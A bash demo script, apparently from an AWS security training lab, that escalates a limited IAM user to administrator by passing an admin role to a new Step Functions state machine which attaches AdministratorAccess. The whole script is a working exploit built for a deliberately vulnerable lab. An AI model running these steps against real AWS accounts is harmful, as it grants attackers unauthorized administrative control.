#!/bin/bash
set -e

# Demo script for iam:PassRole + states:CreateStateMachine + states:StartExecution privilege escalation
# This script demonstrates how a user with PassRole and Step Functions permissions can escalate
# to admin by creating a state machine that calls IAM APIs with an admin role

# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    echo -e "${DIM}\$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    echo -e "\n${CYAN}\$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-stepfunctions-001-to-admin-starting-user"
STATE_MACHINE_NAME="pl-prod-stepfunctions-001-to-admin-privesc-sfn"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM PassRole + Step Functions Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_stepfunctions_001_iam_passrole_states_createstatemachine_states_startexecution.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Extract readonly credentials for observation/polling steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

# Extract resource names from terraform output
ADMIN_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.admin_role_arn')
ADMIN_ROLE_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.admin_role_name')
STARTING_USER_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_name')

AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "Admin Role ARN: $ADMIN_ROLE_ARN"
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

export AWS_REGION=$AWS_REGION

# [EXPLOIT] Step 2: Verify starting user identity
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
use_starting_creds

echo "Using region: $AWS_REGION"

# Verify starting user identity
show_cmd "[Attacker] aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# [OBSERVATION] Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
use_readonly_creds
show_cmd "[ReadOnly] aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# [EXPLOIT] Step 4: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
use_starting_creds
echo "Attempting to list IAM users (should fail)..."
show_cmd "[Attacker] aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# [EXPLOIT] Step 5: Create a Step Functions state machine with the admin role
echo -e "${YELLOW}Step 5: Creating Step Functions state machine with admin role${NC}"
echo "This is the privilege escalation vector - creating a state machine that uses the admin role"
echo "to call iam:AttachUserPolicy, granting AdministratorAccess to our starting user..."
echo ""
echo "State machine name: $STATE_MACHINE_NAME"
echo "Admin role ARN: $ADMIN_ROLE_ARN"
echo "Target user: $STARTING_USER_NAME"
echo ""

# Build the state machine definition
STATE_MACHINE_DEFINITION='{
  "Comment": "Privilege escalation via Step Functions SDK integration",
  "StartAt": "AttachAdminPolicy",
  "States": {
    "AttachAdminPolicy": {
      "Type": "Task",
      "Resource": "arn:aws:states:::aws-sdk:iam:attachUserPolicy",
      "Parameters": {
        "UserName": "'"${STARTING_USER_NAME}"'",
        "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
      },
      "End": true
    }
  }
}'

use_starting_creds
show_attack_cmd "[Attacker] aws stepfunctions create-state-machine --region $AWS_REGION --name $STATE_MACHINE_NAME --definition '...' --role-arn $ADMIN_ROLE_ARN --type STANDARD --output json"
CREATE_OUTPUT=$(aws stepfunctions create-state-machine \
    --region $AWS_REGION \
    --name "$STATE_MACHINE_NAME" \
    --definition "$STATE_MACHINE_DEFINITION" \
    --role-arn "$ADMIN_ROLE_ARN" \
    --type STANDARD \
    --output json)

STATE_MACHINE_ARN=$(echo "$CREATE_OUTPUT" | jq -r '.stateMachineArn')

if [ -z "$STATE_MACHINE_ARN" ] || [ "$STATE_MACHINE_ARN" == "null" ]; then
    echo -e "${RED}Error: Failed to create state machine${NC}"
    echo "$CREATE_OUTPUT"
    exit 1
fi

echo "State Machine ARN: $STATE_MACHINE_ARN"
echo -e "${GREEN}✓ State machine created successfully${NC}\n"

# [EXPLOIT] Step 6: Start execution of the state machine
echo -e "${YELLOW}Step 6: Starting execution of the state machine${NC}"
echo "The state machine will call iam:AttachUserPolicy using the admin role..."
echo ""

use_starting_creds
show_attack_cmd "[Attacker] aws stepfunctions start-execution --region $AWS_REGION --state-machine-arn $STATE_MACHINE_ARN --output json"
EXECUTION_OUTPUT=$(aws stepfunctions start-execution \
    --region $AWS_REGION \
    --state-machine-arn "$STATE_MACHINE_ARN" \
    --output json)

EXECUTION_ARN=$(echo "$EXECUTION_OUTPUT" | jq -r '.executionArn')

if [ -z "$EXECUTION_ARN" ] || [ "$EXECUTION_ARN" == "null" ]; then
    echo -e "${RED}Error: Failed to start execution${NC}"
    echo "$EXECUTION_OUTPUT"
    exit 1
fi

echo "Execution ARN: $EXECUTION_ARN"
echo -e "${GREEN}✓ Execution started${NC}\n"

# [OBSERVATION] Step 7: Wait for execution to complete
echo -e "${YELLOW}Step 7: Waiting for state machine execution to complete${NC}"
echo "This should complete in a few seconds..."
echo ""

use_readonly_creds

MAX_WAIT=120  # 2 minutes
WAIT_TIME=0
EXECUTION_COMPLETE=false

while [ $WAIT_TIME -lt $MAX_WAIT ]; do
    show_cmd "[ReadOnly] aws stepfunctions describe-execution --region $AWS_REGION --execution-arn $EXECUTION_ARN --query 'status' --output text"
    EXEC_STATUS=$(aws stepfunctions describe-execution \
        --region $AWS_REGION \
        --execution-arn "$EXECUTION_ARN" \
        --query 'status' \
        --output text 2>/dev/null || echo "UNKNOWN")

    echo "Execution status: $EXEC_STATUS"

    if [ "$EXEC_STATUS" = "SUCCEEDED" ]; then
        echo -e "${GREEN}✓ Execution completed successfully!${NC}\n"
        EXECUTION_COMPLETE=true
        break
    elif [ "$EXEC_STATUS" = "FAILED" ] || [ "$EXEC_STATUS" = "TIMED_OUT" ] || [ "$EXEC_STATUS" = "ABORTED" ]; then
        echo -e "${RED}Error: Execution failed with status: $EXEC_STATUS${NC}"
        show_cmd "[ReadOnly] aws stepfunctions describe-execution --region $AWS_REGION --execution-arn $EXECUTION_ARN --query 'error' --output text"
        aws stepfunctions describe-execution \
            --region $AWS_REGION \
            --execution-arn "$EXECUTION_ARN" \
            --output json
        exit 1
    fi

    sleep 5
    WAIT_TIME=$((WAIT_TIME + 5))
done

if [ "$EXECUTION_COMPLETE" = false ]; then
    echo -e "${RED}Error: Execution did not complete within timeout${NC}"
    exit 1
fi

# Step 8: Wait for IAM propagation
echo -e "${YELLOW}Step 8: Waiting for IAM policy propagation${NC}"
echo -e "${YELLOW}Waiting 15 seconds for policy to propagate...${NC}"
sleep 15
echo -e "${GREEN}✓ Policy propagated${NC}\n"

# [OBSERVATION] Step 9: Verify privilege escalation
echo -e "${YELLOW}Step 9: Verifying privilege escalation${NC}"
echo "Checking attached policies on our user..."
echo ""

use_readonly_creds
show_cmd "[ReadOnly] aws iam list-attached-user-policies --user-name $STARTING_USER_NAME --output table"
aws iam list-attached-user-policies --user-name "$STARTING_USER_NAME" --output table
echo ""

echo -e "${GREEN}✓ AdministratorAccess policy is now attached to our user!${NC}\n"

# [OBSERVATION] Step 10: Verify admin access
echo -e "${YELLOW}Step 10: Verifying administrator access${NC}"
echo "Attempting to list IAM users..."
echo ""

use_readonly_creds
show_cmd "[ReadOnly] aws iam list-users --max-items 3 --output table"
if aws iam list-users --max-items 3 --output table; then
    echo ""
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    exit 1
fi
echo ""

# Summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (limited permissions)"
echo "2. Created Step Functions state machine with admin role: $ADMIN_ROLE_NAME"
echo "3. State machine definition calls iam:AttachUserPolicy via SDK integration"
echo "4. Executed state machine - attached AdministratorAccess to our user"
echo "5. Achieved: Administrator Access"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER (iam:PassRole + states:CreateStateMachine)"
echo -e "  → Step Functions state machine (using $ADMIN_ROLE_NAME)"
echo -e "  → iam:AttachUserPolicy (AdministratorAccess → $STARTING_USER_NAME)"
echo -e "  → Admin"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- Step Functions state machine: $STATE_MACHINE_NAME ($STATE_MACHINE_ARN)"
echo "- AdministratorAccess policy attached to: $STARTING_USER_NAME"

echo -e "\n${RED}⚠ Warning: The state machine and attached policy still exist${NC}"
echo ""
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
